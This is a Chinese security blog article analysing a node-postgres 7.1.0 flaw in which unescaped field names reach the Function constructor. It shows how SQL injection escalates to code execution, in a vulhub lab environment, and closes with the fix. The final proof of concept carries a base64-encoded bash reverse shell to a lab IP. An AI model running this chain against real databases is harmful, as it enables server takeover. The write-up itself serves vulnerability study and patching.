> 原文链接: https://www.anquanke.com//post/id/87167 


# 【技术分享】node.js + postgres 从注入到Getshell


                                阅读量   
                                **109574**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t019c0bd92e8bcf6b89.png)](https://p5.ssl.qhimg.com/t019c0bd92e8bcf6b89.png)



**前言**

****

（最近你们可能会看到我发很多陈年漏洞的分析，其实这些漏洞刚出来我就想写，不过是没时间，拖延拖延，但该做的事迟早要做的，共勉）

Postgres是现在用的比较多的数据库，包括我自己的博客，数据库都选择使用Postgres，其优点我就不展开说了。node-postgres是node中连接pg数据库的客户端，其中出现过一个代码执行漏洞，非常典型，可以拿出来讲一讲。

<br>

**0x01 Postgres 协议分析**

****

碳基体妹纸曾经分析过postgres的认证协议，显然pg的交互过程其实就是简单的TCP数据包的交互过程，文档中列出了所有数据报文。

其中，我们观察到，pg的通信，其实就是一些预定的message交换的过程。比如，pg返回给客户端的有一种报文叫“RowDescription”，作用是返回每一列（row）的所有字段名（field name）。客户端拿到这个message，解析出其中的内容，即可确定字段名：

 [![](https://p2.ssl.qhimg.com/t01fba2fce4175ff13c.png)](https://p2.ssl.qhimg.com/t01fba2fce4175ff13c.png)

我们可以抓包试一下，关闭服务端SSL，执行SELECT 'phithon' AS "name"，可见客户端发送的报文头是Simple Query，内容就是我执行的这条SQL语句：

 [![](https://p4.ssl.qhimg.com/t013d07041581274590.png)](https://p4.ssl.qhimg.com/t013d07041581274590.png)

返回包分为4个message，分别是T/D/C/Z，查看文档可知，分别是“Row description”、“Data row”、“Command completion”、“Ready for query”：

 [![](https://p4.ssl.qhimg.com/t016e2de36c50b0391e.png)](https://p4.ssl.qhimg.com/t016e2de36c50b0391e.png)

这四者意义如下：

1.“Row description” 字段及其名字，比如上图中有一个字段，名为“name”

2.“Data row” 值，上图中值为“70686974686f6e”，其实就是“phithon”

3.“Command completion” 用来标志执行的语句类型与相关行数，比如上图中，我们执行的是select语句，返回1行数据，所以值是“SELECT 1”

4.“Ready for query” 告诉客户端，可以发送下一条语句了

至此，我们简单分析了一下postgresql的通信过程。明白了这一点，后面的代码执行漏洞，也由此拉开序幕。

<br>

**0x02 漏洞触发点**

****

安装node-postgres的7.1.0版本：npm install pg@7.1.0。在node_modules/pg/lib/connection.js可以找到连接数据库的源码：

[![](https://p2.ssl.qhimg.com/t0192fc4f5ae23f8c64.png)](https://p2.ssl.qhimg.com/t0192fc4f5ae23f8c64.png)

可见，当this._reader.header等于"T"的时候，就进入parseT方法。0x01中介绍过T是什么，T就是“Row description”，表示返回数据的字段数及其名字。比如我执行了SELECT * FROM "user"，pg数据库需要告诉客户端user这个表究竟有哪些字段，parseT方法就是用来获取这个字段名的。

parseT中触发了rowDescription消息，我们看看在哪里接受这个事件：

[![](https://p1.ssl.qhimg.com/t01f63445a730db5372.png)](https://p1.ssl.qhimg.com/t01f63445a730db5372.png)

在client.js中接受了rowDescription事件，并调用了query.js中的handleRowDescription方法，handleRowDescription方法中执行this._result.addFields(msg.fields)语句，并将所有字段传入其中。

跟进addFields方法：

[![](https://p5.ssl.qhimg.com/t01c65685453909be86.png)](https://p5.ssl.qhimg.com/t01c65685453909be86.png)

addFields方法中将所有字段经过inlineParser函数处理，处理完后得到结果ctorBody，传入了Function类的最后一个参数。

熟悉XSS漏洞的同学对“Function”这个类（ [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function)   ）应该不陌生了，在浏览器中我们可以用Function+任意字符串创造一个函数并执行：

 [![](https://www.leavesongs.com/media/attachment/2017/11/04/2d71dcc8-0c6a-4c44-9b34-3135107d0759.png)](https://www.leavesongs.com/media/attachment/2017/11/04/2d71dcc8-0c6a-4c44-9b34-3135107d0759.png)

其效果其实和eval差不多，特别类似PHP中的create_function。那么，Function的最后一个参数（也就是函数体）如果被用户控制，将会创造一个存在漏洞的函数。在前端是XSS漏洞，在后端则是代码执行漏洞。

那么，ctorBody是否可以被用户控制呢？

<br>

**0x03 常见BUG：转义不全导致单引号逃逸**

****

ctorBody是经过inlineParser函数处理的，看看这个函数代码：

[![](https://p3.ssl.qhimg.com/t011e39ecebb3fc8c30.png)](https://p3.ssl.qhimg.com/t011e39ecebb3fc8c30.png)

可见这里是存在字符串拼接，fieldName即为我前面说的“字段名”。虽然存在字符串拼接，但这里单引号'被转义成'：fieldName.replace(/'/g, "\'")。我们在注释中也能看到开发者意识到了单引号需要“escaped”。

但显然，只转义单引号，我们可以通过反斜线来绕过限制：

**' ==&gt; \'**

这是一个比较普遍的BUG，开发者知道需要将单引号前面增加反斜线来转义单引号，但是却忘了我们也可以通过在这二者前面增加一个反斜线来转义新增加的转义符。所以，我们尝试执行如下SQL语句：



```
sql = `SELECT 1 AS "\'+console.log(process.env)]=null;//"`
const res = await client.query(sql)
```

这个SQL语句其实就很简单，因为最后需要控制fieldName，所以我们需要用到AS语句来构造字段名。

动态运行后，在Function的位置下断点，我们可以看到最终传入Function类的函数体：

 [![](https://p4.ssl.qhimg.com/t013558823e300adc69.png)](https://p4.ssl.qhimg.com/t013558823e300adc69.png)

可见，ctorBody的值为：

```
this['\'+console.log(process.env)]=null;//'] = rowData[0] == null ? null : parsers[0](rowData[0]);
```

我逃逸了单引号，并构造了一个合法的JavaScript代码。最后，console.log(process.env)在数据被读取的时候执行，环境变量process.env被输出：

 [![](https://p4.ssl.qhimg.com/t015e21c431baa6c0c3.png)](https://p4.ssl.qhimg.com/t015e21c431baa6c0c3.png)

<br>

**0x04 实战利用**

****

那么，在实战中，这个漏洞如何利用呢？

首先，因为可控点出现在数据库字段名的位置，正常情况下字段名显然不可能被控制。所以，我们首先需要控制数据库或者SQL语句，比如存在SQL注入漏洞的情况下。

所以我编写了一个简单的存在注入的程序：

[![](https://p1.ssl.qhimg.com/t01586e4cd0bd61e790.png)](https://p1.ssl.qhimg.com/t01586e4cd0bd61e790.png)

正常情况下，传入id=1获得第一条数据：

 [![](https://p3.ssl.qhimg.com/t01f2644cc2c953ec5c.png)](https://p3.ssl.qhimg.com/t01f2644cc2c953ec5c.png)

可见，这里id是存在SQL注入漏洞的。那么，我们怎么通过SQL注入控制字段名？

一般来说，这种WHERE后的注入，我们已经无法控制字段名了。即使通过如**SELECT * FROM "user" WHERE id=-1 UNION SELECT 1,2,3 AS "\'+console.log(process.env)]=null;//"**，第二个SELECT后的字段名也不会被PG返回，因为字段名已经被第一个SELECT定死。

但是node-postgres是支持多句执行的，显然我们可以直接闭合第一个SQL语句，在第二个SQL语句中编写POC代码：

 [![](https://www.leavesongs.com/media/attachment/2017/11/04/76aa50fd-802f-463c-8606-534745979671.png)](https://www.leavesongs.com/media/attachment/2017/11/04/76aa50fd-802f-463c-8606-534745979671.png)

虽然返回了500错误，但显然命令已然执行成功，环境变量被输出在控制台：

 [![](https://www.leavesongs.com/media/attachment/2017/11/04/50403baf-0f88-482d-a0c9-aabba014cc37.png)](https://www.leavesongs.com/media/attachment/2017/11/04/50403baf-0f88-482d-a0c9-aabba014cc37.png)

在vulhub搭建了环境，实战中遇到了一些蛋疼的问题：

**单双引号都不能正常使用，我们可以使用es6中的反引号**

**Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。**

**一个fieldName只能有64位长度，所以我们通过多个fieldName拼接来完成利用**

最后构造出如下POC：

```
SELECT 1 AS "']=0;require=process.mainModule.constructor._load;/*", 2 AS "*/p=require(`child_process`);/*", 3 AS "*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*", 4 AS "*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//"
```

发送数据包：

 [![](https://p1.ssl.qhimg.com/t01559d0792418183ab.png)](https://p1.ssl.qhimg.com/t01559d0792418183ab.png)

成功反弹shell：

 [![](https://www.leavesongs.com/media/attachment/2017/11/04/b9c3e660-56e1-4706-af86-e9c6d9aec0ae.png)](https://www.leavesongs.com/media/attachment/2017/11/04/b9c3e660-56e1-4706-af86-e9c6d9aec0ae.png)

<br>

**0x05 漏洞修复**

****

官方随后发布了漏洞通知： [https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability](https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability)   以及修复方案： [https://github.com/brianc/node-postgres/blob/884e21e/lib/result.js#L86](https://github.com/brianc/node-postgres/blob/884e21e/lib/result.js#L86) 

可见，最新版中将**fieldName.replace(/'/g, "\'")**修改为**escape(fieldName)**，而escape函数来自这个库：[https://github.com/joliss/js-string-escape](https://github.com/joliss/js-string-escape)   ，其转义了大部分可能出现问题的字符。
